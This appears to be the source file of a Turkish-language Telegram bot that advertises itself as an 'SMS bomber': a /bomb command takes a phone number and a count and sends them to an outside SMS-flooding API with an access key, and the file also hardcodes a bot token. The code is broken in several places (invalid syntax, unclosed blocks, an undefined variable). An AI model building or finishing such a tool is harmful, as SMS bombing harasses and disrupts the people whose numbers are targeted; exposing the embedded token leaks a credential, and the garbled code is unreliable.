const { Telegraf } = require('telegraf');
const { performance } = require('perf_hooks');
const bot = new Telegraf('6357522659:AAFUp0jzOcLBNiNBPGON-SO6srVMC_dqpkw');
const http = require('http')
const fs = require('fs');




bot.command('ban', (ctx) => {
  const bannedUserId = ctx.message.reply_to_message.from.id;
  
  fs.appendFile('banneds.txt', `\n${bannedUserId}`, (error) => {
    if (error) {
      console.error('Yasaklama işlemi başarısız oldu:', error);
      ctx.reply('Kullanıcı yasaklandı!', error);
    } else {
      console.log('Kullanıcı yasaklandı:', bannedUserId);
      ctx.reply('Kullanıcı yasaklandı!');
    }
  });
});




bot.command("start", (ctx) => {
  const bannedIds = fs.readFileSync('banneds.txt', 'utf-8').split('\n');
  const userId = ctx.message.from.id;

  if (bannedIds.includes(userId.toString())) {
    console.log('Kullanıcı yasaklandı:', userId);
    return ctx.reply('Üzgünüz, yasaklandınız!');
  }

  ctx.replyWithMarkdown(`*Merhaba, SMS bomber botuna hoş geldin!*`
    + `\n_Kullanmak için /bomb <numara> <miktar> yazmanız yeterlidir._`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Ping değerini görüntüle', callback_data: 'ping' }]
      ]
    }
  });
});
bot.action('ping', (ctx) => {
    const start = performance.now();
    const chatId = ctx.chat.id;
    const messageId = ctx.message.message_id;
    ctx.replyWithMarkdown("*Ping ölçülüyor...*")
    const end = performance.now();
    const pingTime = Math.round(end - start);
    const alertText = `Ping değeri:. ${pingTime}`;
    return ctx.answerCbQuery({text:alertText, show_alert: true});
    ctx.deleteMessage();
});
//https://oslocheck.com.tr/api/smsbomber?key=ggsahip&numara=${numara}&miktar=${miktar}

bot.command("bomb", (ctx, match) => {
    const bannedIds = fs.readFileSync('banneds.txt', 'utf-8').split('\n');
    if (bannedIds.includes(userId.toString())) {
      console.log('Kullanıcı yasaklandı:', userId);
      return ctx.reply('Üzgünüz, yasaklandınız!');
      return;
    const numara = match[1:]
    const miktar = match[2:]
    http.get(`https://oslocheck.com.tr/api/smsbomber?key=ggsahip&numara=${numara}&miktar=${miktar.toString()}`, (res) => {
        let responseData = '';

        res.on('data', (chunk) => {
            responseData += chunk;
  });

        res.on('end', () => {
            console.log('Alınan metin:', responseData);
            ctx.replyWithHtml(`<b>Sonuç:</b> <code> ${responseData} </code>`)
});


bot.launch();



